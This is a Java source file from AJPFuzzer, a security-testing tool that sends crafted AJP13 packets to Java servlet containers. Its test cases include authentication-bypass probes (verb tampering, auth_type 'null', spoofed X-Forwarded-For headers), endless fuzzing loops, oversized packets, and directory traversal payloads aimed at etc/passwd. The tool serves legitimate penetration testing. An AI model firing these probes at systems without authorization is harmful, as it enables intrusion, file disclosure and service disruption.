/*
 * AJPFuzzer - AJPTestCases.java
 *
 * Copyright (c) 2017 Luca Carettoni - Doyensec LLC. 
 */
package com.doyensec.ajpfuzzer;

import asg.cliche.Command;
import asg.cliche.Param;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;
import com.doyensec.ajp13.AjpMessage;
import com.doyensec.ajp13.AjpReader;
import com.doyensec.ajp13.BodyMessage;
import com.doyensec.ajp13.CPingMessage;
import com.doyensec.ajp13.CPongMessage;
import com.doyensec.ajp13.EndResponseMessage;
import com.doyensec.ajp13.ForwardRequestMessage;
import com.doyensec.ajp13.SendBodyChunkMessage;
import com.doyensec.ajp13.GetBodyChunkMessage;
import com.doyensec.ajp13.Pair;
import com.doyensec.ajp13.PingMessage;
import com.doyensec.ajp13.SendHeadersMessage;
import com.doyensec.ajp13.ShutdownMessage;

public class AJPTestCases {

    private final AJPFuzzer ajpsocket;

    AJPTestCases(AJPFuzzer ajpsocket) {
        this.ajpsocket = ajpsocket;
    }

    //Expose socket Status, Reconnect, Quit in the subshell
    @Command(description = "Status of the connection to the remote AJP13 service", name = "status", abbrev = "sta")
    public void status() throws IOException {
        ajpsocket.status();
    }

    @Command(description = "Reconnect to the remote AJP13 service", name = "reconnect", abbrev = "rc")
    public void reconnect() {
        ajpsocket.reconnect();
    }

    @Command(description = "Disconnect and quit AJPFuzzer", name = "quit", abbrev = "quit")
    public void quit() {
        ajpsocket.quit();
    }

    /*
     * Test Case id: 1 
     * Test Case name: body 
     * Description: Send a body message from the web server to the J2EE container
     */
    @Command(description = "Send a Body (no type) AJP13 packet", name = "body", abbrev = "1")
    public void bodyMessage(@Param(name = "data", description = "Body content (e.g. 41424344)") String data) throws UnsupportedEncodingException, IOException {
        byte[] bodyContent;
        if (data.isEmpty()) {
            bodyContent = new byte[0]; //send empty
        } else {
            bodyContent = AjpReader.toHex(data);
        }
        AjpMessage msg = new BodyMessage(bodyContent);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(1) body");
    }

    /*
     * Test Case id: 2 
     * Test Case name: forwardrequest 
     * Description: Begin the request processing cycle from the web server to the J2EE container
     * 
     * Headers and attributes passed as <name>:<value>,<name>:<value>,...
     */
    @Command(description = "Send a ForwardRequest (type 2) AJP13 packet", name = "forwardrequest", abbrev = "2")
    public void forwardRequestMessage(@Param(name = "method", description = "HTTP verb (e.g. GET=2)") int method,
            @Param(name = "protocol", description = "HTTP protocol (e.g. HTTP/1.1)") String protocol,
            @Param(name = "requestUri", description = "Request URI (e.g. /api/)") String requestUri,
            @Param(name = "remoteAddr", description = "Client IP address") String remoteAddr,
            @Param(name = "remoteHost", description = "Client FQDN") String remoteHost,
            @Param(name = "serverName", description = "Server FQDN") String serverName,
            @Param(name = "serverPort", description = "Server TCP port") int serverPort,
            @Param(name = "isSsl", description = "Is SSL? Boolean") boolean isSsl,
            @Param(name = "headers", description = "HTTP headers as <name>:<value>,<name>:<value>,...") String headers,
            @Param(name = "attributes", description = "HTTP attributes as <name>:<value>,<name>:<value>,...") String attributes) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headersList = null;
        if (headers.contains(":")) {
            //Convert headers string to java.util.List<Pair<java.lang.String,java.lang.String>>
            String[] header = headers.split(",");
            headersList = new LinkedList<>();
            for (int i = 0; i < header.length; i++) {
                String[] nameValue = header[i].split(":");
                headersList.add(Pair.make(nameValue[0], nameValue[1]));
            }
        }

        List<Pair<String, String>> attributesList = null;
        if (attributes.contains(":")) {
            //Convert attributes string to java.util.List<Pair<java.lang.String,java.lang.String>>
            String[] attribute = attributes.split(",");
            attributesList = new LinkedList<>();
            for (int i = 0; i < attribute.length; i++) {
                String[] nameValue = attribute[i].split(":");
                attributesList.add(Pair.make(nameValue[0], nameValue[1]));
            }
        }
        AjpMessage msg = new ForwardRequestMessage(method, protocol, requestUri,
                remoteAddr, remoteHost, serverName, serverPort, isSsl, headersList, attributesList);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(2) forwardrequest");
    }

    /*
     * Test Case id: 3 
     * Test Case name: sendbodychunk 
     * Description: Send a chunk of the body from the J2EE container to the web server
     */
    @Command(description = "Send a SendBodyChunk (type 3) AJP13 packet", name = "sendbodychunk", abbrev = "3")
    public void sendBodyChunkMessage(@Param(name = "data", description = "Body chunk (e.g. 41424344)") String data) throws UnsupportedEncodingException, IOException {
        byte[] bodyChunk;
        if (data.isEmpty()) {
            bodyChunk = new byte[0]; //send empty
        } else {
            bodyChunk = AjpReader.toHex(data);
        }
        AjpMessage msg = new SendBodyChunkMessage(bodyChunk);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(3) sendbodychunk");
    }

    /*
     * Test Case id: 4
     * Test Case name: sendheaders 
     * Description: Send the response headers from the J2EE container to the web server
     */
    @Command(description = "Send a SendHeaders (type 4) AJP13 packet", name = "sendheaders", abbrev = "4")
    public void sendHeadersMessage(@Param(name = "statuscode", description = "HTTP Status Code (e.g. 200)") int statusCode,
            @Param(name = "statusmessage", description = "HTTP Status Message (e.g. OK)") String statusMessage,
            @Param(name = "headers", description = "HTTP headers as <name>:<value>,<name>:<value>,...") String headers) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headersList = null;
        if (headers.contains(":")) {
            //Convert headers string to java.util.List<Pair<java.lang.String,java.lang.String>>
            String[] header = headers.split(",");
            headersList = new LinkedList<>();
            for (int i = 0; i < header.length; i++) {
                String[] nameValue = header[i].split(":");
                headersList.add(Pair.make(nameValue[0], nameValue[1]));
            }
        }
        AjpMessage msg = new SendHeadersMessage(statusCode, statusMessage, headersList);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(4) sendheaders");
    }

    /*
     * Test Case id: 5 
     * Test Case name: endresponse 
     * Description: Mark the end of the response, from the J2EE container to the web server
     */
    @Command(description = "Send a EndResponse (type 5) AJP13 packet", name = "endresponse", abbrev = "5")
    public void endResponseMessage(@Param(name = "reuse", description = "Reuse the same TCP session? Boolean") boolean reuse) throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new EndResponseMessage(reuse);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(5) endresponse");
    }

    /*
     * Test Case id: 6 
     * Test Case name: getbodychunk 
     * Description: Get further data from the requestor. Message from the J2EE container to the web server
     */
    @Command(description = "Send a GetBodyChunk (type 6) AJP13 packet", name = "getbodychunk", abbrev = "6")
    public void getBodyChunkMessage(@Param(name = "length", description = "The expected body chunk message size") int length) throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new GetBodyChunkMessage(length);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(6) getbodychunk");
    }

    /*
     * Test Case id: 7 
     * Test Case name: shutdown 
     * Description: Send a standard shutdown AJP13 packet
     */
    @Command(description = "Send a shutdown (type 7) AJP13 packet", name = "shutdown", abbrev = "7")
    public void shutdownMessage() throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new ShutdownMessage();
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(7) shutdown");
    }

    /*
     * Test Case id: 8 
     * Test Case name: ping 
     * Description: Send a ping (not CPing!!!) AJP13 packet
     */
    @Command(description = "Send a ping (type 8) AJP13 packet", name = "ping", abbrev = "8")
    public void pingMessage() throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new PingMessage();
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(8) ping");
    }

    /*
     * Test Case id: 9 
     * Test Case name: cpong 
     * Description: Send a CPong AJP13 packet
     */
    @Command(description = "Send a CPong (type 9) AJP13 packet", name = "cpong", abbrev = "9")
    public void cPongMessage() throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new CPongMessage();
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(9) cpong");
    }

    /*
     * Test Case id: 10 
     * Test Case name: cping 
     * Description: Send a CPing AJP13 packet
     */
    @Command(description = "Send a CPing (type 10) AJP13 packet", name = "cping", abbrev = "10")
    public void cPingMessage() throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new CPingMessage();
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(10) cping");
    }

    /*
     * Test Case id: 11 
     * Test Case name: forwardreqalltypes 
     * Description: Send a ForwardRequest AJP13 packet, with all possible packet types
     */
    @Command(description = "Send a ForwardRequest AJP13 packet, with tampered packet type (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1337)", name = "forwardreqalltypes", abbrev = "11")
    public void forwardRequestWithAllTypes(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        URL surl = new URL(url);
        AjpMessage msg = new ForwardRequestMessage(2, "HTTP/1.1", surl.getPath(),
                "127.0.0.1", "localhost", surl.getHost(),
                ((surl.getPort() == -1) ? surl.getDefaultPort() : surl.getPort()),
                surl.getProtocol().equalsIgnoreCase("https"), null, null);
        int[] test = new int[]{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1337};
        byte[] msgInBytes = msg.getBytes();
        for (int type : test) {
            msgInBytes[4] = (byte) type;
            Utils.sendAndReceiveVerbose(ajpsocket, msgInBytes, "(11) forwardreqalltypes - type:" + type);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ex) {
                Thread.currentThread().interrupt();
            }
        }

    }

    /*
     * Test Case id: 12
     * Test Case name: verbtampering
     * Description: Send multiple requests via AJP13 and do HTTP Verb Tampering, to detect potential authentication bypass flaws
     */
    @Command(description = "Send multiple ForwardRequest (type 2) AJP13 packets using HTTP Verb Tampering", name = "verbtampering", abbrev = "12")
    public void bypassAuthMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new ForwardRequestMessage(2, new URL(url), null, null);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(12) verbtampering - GET");
        //Try again with HEAD 3
        msg = new ForwardRequestMessage(3, new URL(url), null, null);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(12) verbtampering - HEAD");
        //Try again with SEARCH 21
        msg = new ForwardRequestMessage(21, new URL(url), null, null);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(12) verbtampering - SEARCH");
    }

    /*
     * Test Case id: 13
     * Test Case name: jettyleak 
     * Description: Send a JettyLeak style AJP13 packet
     */
    @Command(description = "Send a ForwardRequest (type 2) AJP13 packet, with JettyLeak header", name = "jettyleak", abbrev = "13")
    public void jettyLeakMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headers = new LinkedList<>();
        String nullbyte = "\u0000";
        headers.add(Pair.make("Cookie", StringUtils.repeat(nullbyte, 33)));
        AjpMessage msg = new ForwardRequestMessage(2, new URL(url), headers, null);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(13) jettyleak");
    }

    /*
     * Test Case id: 14
     * Test Case name: hugelengthsmallbody
     * Description: Send ForwardRequest+Body messages, with a big Content-Length and small Body
     */
    @Command(description = "Send a POST ForwardRequest (type 2) with big Content-Length, followed by a small Body AJP13 packet", name = "hugelengthsmallbody", abbrev = "14")
    public void bodyHugeMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        AjpMessage msg = ForwardRequestMessage.ForwardRequestMessagePostBuilder(new URL(url), 100000);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(14) hugelengthsmallbody");
        msg = new BodyMessage("HugeContentLengthSmallBody".getBytes());
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(14) hugelengthsmallbody");
    }

    /*
     * Test Case id: 15
     * Test Case name: hugeheader 
     * Description: Send two AJP13 ForwardRequest packets with header length greater than 0x9999 (e.g. A010)
     */
    @Command(description = "Send two GET ForwardRequest (type 2) packets with header larger than 0x9999 (0xA010)", name = "hugeheader", abbrev = "15")
    public void hugeHeaderMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headers = new LinkedList<>();
        headers.add(Pair.make(StringUtils.repeat("A", 40976), "BBBB"));
        AjpMessage msg = new ForwardRequestMessage(2, new URL(url), headers, null);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(15) hugeheader - name 40976 bytes");
        headers = new LinkedList<>();
        headers.add(Pair.make(StringUtils.repeat("C", 40976), StringUtils.repeat("D", 40976)));
        msg = new ForwardRequestMessage(2, new URL(url), headers, null);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(15) hugeheader - name and value 40976 bytes each");
    }

    /*
     * Test Case id: 16
     * Test Case name: fuzzbit
     * Description: Create a complex AJP13 ForwardRequest and start bit flipping
     */
    @Command(description = "Create a complex GET ForwardRequest (type 2) and start bit flipping (infite loop)", name = "fuzzbit", abbrev = "16")
    public void fuzzBitMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headers = new LinkedList<>();
        headers.add(Pair.make("Content-Type", "text/html; charset=utf-8"));
        //Add additional headers to bypass potential checks or WAF
        headers.add(Pair.make("X-Forwarded-For", "127.0.0.1"));
        headers.add(Pair.make("X-Remote-IP", "127.0.0.1"));
        headers.add(Pair.make("X-Originating-IP", "127.0.0.1"));
        headers.add(Pair.make("x-Remote-Addr", "127.0.0.1"));
        headers.add(Pair.make("User-Agent", "null"));
        List<Pair<String, String>> attributes = new LinkedList<>();
        attributes.add(Pair.make("jvm_route", "0"));
        attributes.add(Pair.make("context", "aaaa"));
        attributes.add(Pair.make("auth_type", "anonymous"));
        URL ulrv = new URL(url);
        AjpMessage msg = new ForwardRequestMessage(2, "HTTP/1.1", ulrv.getPath(), "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), headers, attributes);
        byte[] msgGene = msg.getBytes();
        //First, send msg as it is
        Utils.sendAndReceiveVerbose(ajpsocket, msgGene, "(16) fuzzbit - original");
        //Start bit flipping
        while (true) {
            Utils.sendAndReceiveVerbose(ajpsocket, Utils.flipBit(msgGene), "(16) fuzzbit - iteration");
        }
    }

    /*
     * Test Case id: 17
     * Test Case name: fuzzslice 
     * Description: Create an AJP13 ForwardRequest, SendHeaders, ShutDown, 0xFF, 0x00. Slice and send.
     */
    @Command(description = "Create a complex POST ForwardRequest (type 2), SendHeaders, ShutDown, 0xFF, 0x00. Slice and send. (Infite Loop)", name = "fuzzslice", abbrev = "17")
    public void fuzzSliceMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headers = new LinkedList<>();
        headers.add(Pair.make("Content-Type", "binary/octet-stream"));
        headers.add(Pair.make("Accept-Charset", "iso-8859-5, unicode-1-1;q=0.8"));
        headers.add(Pair.make("User-Agent", "Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3B48b Safari/419.3"));
        List<Pair<String, String>> attributes = new LinkedList<>();
        attributes.add(Pair.make("context", "1111"));
        attributes.add(Pair.make("servlet_path", "2222"));
        attributes.add(Pair.make("remote_user", "3333"));
        attributes.add(Pair.make("auth_type", "4444"));
        attributes.add(Pair.make("query_string", "5555"));
        attributes.add(Pair.make("route", "6666"));
        attributes.add(Pair.make("ssl_cert", "7777"));
        attributes.add(Pair.make("ssl_cipher", "8888"));
        attributes.add(Pair.make("secret", "9999"));
        URL ulrv = new URL(url);
        AjpMessage msg = new ForwardRequestMessage(4, "HTTP/1.1", ulrv.getPath(), "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), headers, attributes);
        byte[] msgFwd = msg.getBytes();

        //First, send msg as it is
        Utils.sendAndReceiveVerbose(ajpsocket, msgFwd, "(17) fuzzslice - original");

        //Create other packets
        msg = new SendHeadersMessage(404, "NOT FOUND", headers);
        byte[] msgSHead = msg.getBytes();

        msg = new ShutdownMessage();
        byte[] msgShut = msg.getBytes();

        byte[] msgFinal = new byte[1];
        msgFinal[0] = (byte) 0xFF;

        byte[] msgNull = new byte[1];
        msgNull[0] = (byte) 0x00;

        //Start slicing 1-msgFwd, 2-msgSHead, 3-msgShut, 4-msgFinal, 5-msgNull
        while (true) {
            byte[] slice1 = Utils.sliceFromBegin(msgFwd);
            byte[] slice2 = Utils.sliceAll(msgSHead);
            byte[] slice3 = Utils.sliceAll(msgShut);
            byte[] slice4 = Utils.sliceAll(msgFinal);
            byte[] slice5 = Utils.sliceAll(msgNull);
            Utils.sendAndReceiveVerbose(ajpsocket, ArrayUtils.addAll(slice1, slice2), "(17) fuzzslice - msgFwd and msgSHead");
            Utils.sendAndReceiveVerbose(ajpsocket, ArrayUtils.addAll(slice1, slice3), "(17) fuzzslice - msgFwd and msgShut");
            Utils.sendAndReceiveVerbose(ajpsocket, ArrayUtils.addAll(slice1, slice4), "(17) fuzzslice - msgFwd and msgFinal");
            Utils.sendAndReceiveVerbose(ajpsocket, ArrayUtils.addAll(slice1, slice5), "(17) fuzzslice - msgFwd and msgNull");
        }
    }

    /*
     * Test Case id: 18
     * Test Case name: servletpath 
     * Description: Create an AJP13 ForwardRequest with arbitrary 'servlet_path' attribute
     */
    @Command(description = "Create an AJP13 ForwardRequest with arbitrary 'servlet_path' attribute", name = "servletpath", abbrev = "18")
    public void servletPathMessage(@Param(name = "url", description = "Forward Request URL") String url, @Param(name = "servletpath", description = "servlet_path attribute") String servletpath) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> attributes = new LinkedList<>();
        attributes.add(Pair.make("servlet_path", servletpath));
        URL ulrv = new URL(url);
        AjpMessage msg = new ForwardRequestMessage(2, "HTTP/1.1", ulrv.getPath(), "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), null, attributes);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(18) servletpath - value:" + servletpath);
    }

    /*
     * Test Case id: 19
     * Test Case name: bypassauthnull 
     * Description: Create two AJP13 ForwardRequest with auth_type set to 'null'
     */
    @Command(description = "Create two AJP13 ForwardRequest with auth_type set to 'null'", name = "bypassauthnull", abbrev = "19")
    public void authNullMessage(@Param(name = "url", description = "Forward Request URL") String url) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> headers = new LinkedList<>();
        headers.add(Pair.make("X-Forwarded-For", "127.0.0.1"));
        headers.add(Pair.make("X-Remote-IP", "127.0.0.1"));
        headers.add(Pair.make("X-Originating-IP", "127.0.0.1"));
        headers.add(Pair.make("x-Remote-Addr", "127.0.0.1"));
        List<Pair<String, String>> attributes = new LinkedList<>();
        attributes.add(Pair.make("auth_type", "null"));
        URL ulrv = new URL(url);
        AjpMessage msg = new ForwardRequestMessage(2, "HTTP/1.1", ulrv.getPath(), "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), headers, attributes);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(19) bypassauthnull - string 'null'");
        attributes = new LinkedList<>();
        attributes.add(Pair.make("auth_type", ""));
        msg = new ForwardRequestMessage(2, "HTTP/1.1", ulrv.getPath(), "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), headers, attributes);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(19) bypassauthnull - empty string");
    }

    /*
     * Test Case id: 20
     * Test Case name: envars
     * Description: Create an AJP13 ForwardRequest with req_attribute_code (10) in order to set arbitrary environmental variables
     */
    @Command(description = "Create an AJP13 ForwardRequest with req_attribute_code (10) in order to set arbitrary environmental variables", name = "envars", abbrev = "20")
    public void enVarsMessage(@Param(name = "url", description = "Forward Request URL") String url, @Param(name = "enname", description = "environmental variable name") String enname, @Param(name = "envalue", description = "environmental variable value") String envalue) throws UnsupportedEncodingException, IOException {
        List<Pair<String, String>> attributes = new LinkedList<>();
        attributes.add(Pair.make(enname, envalue));
        URL ulrv = new URL(url);
        AjpMessage msg = new ForwardRequestMessage(2, "HTTP/1.1", ulrv.getPath(), "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), null, attributes);
        Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(20) envars - " + enname + ":" + envalue);
    }

    /*
     * Test Case id: 21
     * Test Case name: hugepacketsize
     * Description: Create two AJP13 requests with size > 8192 bytes
     */
    @Command(description = "Send two CPing (type 10) AJP13 packets with wrong (> 8192 bytes) size", name = "hugepacketsize", abbrev = "21")
    public void cPingHugeMessage() throws UnsupportedEncodingException, IOException {
        AjpMessage msg = new CPingMessage();
        byte[] msgInBytes = msg.getBytes();
        msgInBytes[2] = (byte) 0x20;
        msgInBytes[3] = (byte) 0x32;
        Utils.sendAndReceiveVerbose(ajpsocket, msgInBytes, "(21) hugepacketsize - 8242 bytes");
        msgInBytes[2] = (byte) 0xFF;
        msgInBytes[3] = (byte) 0xFF;
        Utils.sendAndReceiveVerbose(ajpsocket, msgInBytes, "(21) hugepacketsize - 65535 bytes");
    }

    /*
     * Test Case id: 22
     * Test Case name: dirtraversal
     * Description: Create an AJP13 ForwardRequest (GET) with multiple directory traversal payloads
     */
    @Command(description = "Create an AJP13 ForwardRequest (GET) with multiple directory traversal payloads", name = "dirtraversal", abbrev = "22")
    public void dirTraversalMessage(@Param(name = "url", description = "Forward Request URL (Path is discarded)") String url) throws UnsupportedEncodingException, IOException {
        InputStream in = getClass().getResourceAsStream("/dirtrav.list");
        try (BufferedReader br = new BufferedReader(new InputStreamReader(in))) {
            String line;
            while ((line = br.readLine()) != null) {
                // Single payload
                if (Utils.isWindows()) { //assuming target app is running on the same host 
                    line = line.trim().replaceAll("FILE", "Boot.ini");
                } else {
                    //Unix-like
                    line = line.trim().replaceAll("FILE", "etc/passwd");
                }
                List<Pair<String, String>> attributes = new LinkedList<>();
                attributes.add(Pair.make("servlet_path", line));
                URL ulrv = new URL(url);
                AjpMessage msg = new ForwardRequestMessage(2, "HTTP/1.1", line, "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), null, attributes);
                Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(22) dirtraversal - relative path");
                msg = new ForwardRequestMessage(2, "HTTP/1.1", "/" + line, "127.0.0.1", "localhost", ulrv.getHost(), ((ulrv.getPort() == -1) ? ulrv.getDefaultPort() : ulrv.getPort()), ulrv.getProtocol().equalsIgnoreCase("https"), null, attributes);
                Utils.sendAndReceiveVerbose(ajpsocket, msg.getBytes(), "(22) dirtraversal - absolute path");
            }
        }
    }
}
